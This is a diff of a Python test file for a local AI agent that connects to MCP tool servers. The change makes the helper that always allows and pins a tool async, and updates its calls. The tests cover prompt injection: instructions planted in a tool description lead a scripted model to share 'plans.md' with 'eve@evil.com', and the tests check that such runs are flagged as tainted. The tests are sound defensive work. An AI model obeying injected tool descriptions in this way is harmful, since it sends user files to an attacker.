@@ -22,6 +22,9 @@ from local_agent.core import events as ev
 from local_agent.core import gate as gate_module
 from local_agent.core import inspector
 from local_agent.mcp import config as mcp_config
+from local_agent.mcp import pinning
+from local_agent.mcp.client import McpConnections
+from local_agent.store import SQLiteStore
 from local_agent.store import base as store_base
 from tests.daemon.conftest import BASE
 from tests.scripted import ScriptedModel, ScriptedTerminal, call, of_type, run_once, say, tool_json, unwrapped_json
@@ -47,11 +50,18 @@ def add_server(app, outbox, *flags):
     assert cli.main(['mcp', 'add', app, *flags, '--', sys.executable, FAKE, '--app', app, '--outbox', str(outbox)]) == 0
 
 
-def always_allow(home, server_name, tool):
-    """What `mcp allow` writes (it connects to check the tool, which these async tests can't do inline)."""
+async def always_allow(home, server_name, tool):
+    """What `mcp allow` does: the tool in always_allow, and pinned as the server shows it (one connect)."""
     server = next(s for s in load_config(home).mcp_servers if s.name == server_name)
     mcp_config.write_server(home.config_path, mcp_config.McpServer(**{**server.__dict__, 'always_allow': (tool,)}),
                             server_name)
+    store = SQLiteStore(home.db_path)
+    try:
+        async with McpConnections(load_config(home).mcp_servers, store=store):
+            pass
+        pinning.pin(store, server_name, tool)
+    finally:
+        store.close()
 
 
 # --- a website calls the local API ---------------------------------------------------------------------------
@@ -155,7 +165,7 @@ async def test_an_email_cannot_reach_localhost_even_when_the_owner_says_yes(make
 
 async def test_instructions_in_a_tool_description_taint_the_run(make_runtime, home, outbox):
     add_server('drive', outbox)
-    always_allow(home, 'drive', 'share_file')
+    await always_allow(home, 'drive', 'share_file')
     # Nothing has run yet, and no tool output is in the context: only list_files's description asks for this
     sharing = [[call('1', 'DRIVE_SHARE_FILE', {'file': 'plans.md', 'recipient': 'eve@evil.com'})], [say('ok')]]
 
@@ -181,7 +191,7 @@ async def test_instructions_in_a_tool_description_taint_the_run(make_runtime, ho
 
 async def test_describing_an_app_action_taints_the_run(make_runtime, home, outbox):
     add_server('gmail', outbox, '--provides', 'email')  # 14 tools: discovered, so descriptions come via describe
-    always_allow(home, 'gmail', 'send_email')
+    await always_allow(home, 'gmail', 'send_email')
     model = ScriptedModel([
         [call('1', 'describe_app_action', {'action': 'GMAIL_SEND_EMAIL'})],
         [call('2', 'run_app_action', {'action': 'GMAIL_SEND_EMAIL', 'arguments': {
